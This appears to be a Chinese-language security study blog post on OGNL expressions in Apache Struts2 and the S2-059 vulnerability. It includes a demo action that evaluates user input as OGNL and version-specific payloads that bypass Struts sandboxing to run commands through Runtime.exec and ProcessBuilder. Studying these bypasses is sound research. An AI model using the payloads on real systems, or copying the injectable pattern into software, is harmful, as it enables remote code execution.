---
layout:     post
title:      Struts2 ONGL 表达式
subtitle:   开始接触struts2框架、继续学习java的表达式
date:       2020-10-11
author:     BY Diego
header-img: /img/wenzhang/post-bg-java-struts-ognl.jpg
catalog: true
tags:
    - Java
    - 命令注入
---



![0csDU0.png](https://s1.ax1x.com/2020/10/11/0csDU0.png)![0csDU0.png](https://s1.ax1x.com/2020/10/11/0csDU0.png)





### Ognl 表达式基本使用



使用方法：

```java
OgnlContext context = new OgnlContext()  //创建一个Ognl上下文环境
context.setRoot() //设置root元素 （根元素
context.put("id",1) //向环境变量中加入变量
Object ognl = Ognl.parseExpression("#id") //建立表达式 (取值
value = Ognl.getValue(ognl,context,context.getRoot()) //执行
```



demo 类

```java
package com.diego.demo;

import com.opensymphony.xwork2.Action;
import com.opensymphony.xwork2.ActionContext;
import ognl.Ognl;
import ognl.OgnlContext;

public class Ognl_test implements Action {

    public String payload;

    public class Users{
        Users(Integer age,String name){
            this.age = age;
            this.name = name;
        }
        public Integer age ;
        public String name ;
    }
    
    public String getPayload(){
        return payload;
    }

    @Override
    public String execute() throws Exception {
        // 创建 Action 容器
        ActionContext actionContext = ActionContext.getContext();
        if(payload != null){
			// 创建一个Ognl上下文环境
            OgnlContext context = new OgnlContext();
            Object value = null;
            try {
                // id = 1 加入环境变量
                context.put("id",1);
                Users users1 = new Users(1,"Diego1");
                Users users2 = new Users(2,"Diego2");
                // users1 users2 加入环境变量
                context.put("users1",users1);
                context.put("users2",users2);
                // 设置users1 为ROOT对象
                context.setRoot(users1);
				// 创建 Ognl 表达式
                Object ognl = Ognl.parseExpression(payload);
                // 解析表达式
                value = Ognl.getValue(ognl,context,context.getRoot());
            } catch (Exception e) {
                e.printStackTrace();
            }
            // 解析结果 放入Action 容器
            actionContext.put("res",value);
            System.out.println(value);
            return SUCCESS;
        }else{
            return ERROR;
        }
    }
}

```



结合上面例子看出Ognl语法为 ：

**访问非根元素 :**

* #[变量]    ----->  `#users2` ,`#id`

* #\[对象][属性]   ----->  `#users2.age`

* #\[对象]\[方法名]()   ----->  `#users2.test()`

**访问根元素：** （以一个对象为根元素 访问成员或方法时可以 去掉`#对象名.`

* \[对象][属性]  ----->  `age`,`name`
* \[对象]\[方法名]()  ----->  `test()`

  **调用方法**：

* `xxx.getName()`

**支持类静态的方法调用和值访问**

 格式：`@[类全名（包括包路径）]@[方法名 |  值名]`

* 调用方法 `@java.lang.Runtime@getRuntime().exec('calc')`

* 调用成员 `@com.diego.demo.Ognl_test@aaa`  //

![0rYB28.png](https://s1.ax1x.com/2020/10/09/0rYB28.png)

**可以给上下文的变量赋值**

* 一般变量 `#id=111111,#id` 
* 成员变量 `#users2.age=99999,#users2.age`

![0rNxDe.png](https://s1.ax1x.com/2020/10/09/0rNxDe.png)

**静态方法调用**

* `@@min(1,2)`



**多语句执行**

* `().() 可以执行多语句`

### Ognl命令注入 历史漏洞

以下都是绕过`SecurityMemberAccess` 或者修改 `memberAccess`

**Struts 2.3.14.1版本前**

```
(#_memberAccess['allowStaticMethodAccess']=true).(@java.lang.Runtime@getRuntime().exec('calc'))
```

**2.3.14.1后 - 2.3.20版本前**

```
(#p=new java.lang.ProcessBuilder('calc')).(#p.start())
```



**2.3.20版本 - 2.3.28版本** (本地2.3.37 也可

```
(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
(@java.lang.Runtime@getRuntime().exec('calc'))
```



**2.3.30(2.5.2)之后**

```
(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).
(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).
(@java.lang.Runtime@getRuntime().exec('calc'))
```



**2.5.16**

```
第一次

(#context=#attr['struts.valueStack'].context).
(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))

第二次
(#context=#attr['struts.valueStack'].context).
(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).
(@java.lang.Runtime@getRuntime().exec('curl 127.0.0.1:9001'))
```





### Struts2 059

影响版本

Struts 2.0.0 - Struts 2.5.20

Apache Struts 2 会对某些标签属性（比如 id）的属性值进行二次表达式解析，并且在 Struts 标签属性内强制进行 OGNL 表达式解析时的情况因此在某些场景下将可能导致远程代码执行。



服务端代码 （及diego可控

```java
public class Ognl_test implements Action {
    
    public String diego ;
    public String getDiego(){
        return diego;
    }
    
    @Override
    public String execute() throws Exception {
        ActionContext actionContext = ActionContext.getContext();
        if(diego != null){
            actionContext.put("diego",diego);
            return SUCCESS;
        }else{
            return ERROR;
        }
    }
}
```



Ognl.jsp

![0cBkAf.png](https://s1.ax1x.com/2020/10/11/0cBkAf.png)





![0cDZa6.png](https://s1.ax1x.com/2020/10/11/0cDZa6.png)



`%{(#aaaa=123456).(#aaaa)}` ,可以执行Ognl 表达式

![0cruT0.png](https://s1.ax1x.com/2020/10/11/0cruT0.png)



绕过方法与`Ognl命令注入` 相同

s2-059 payload 与具体版本有关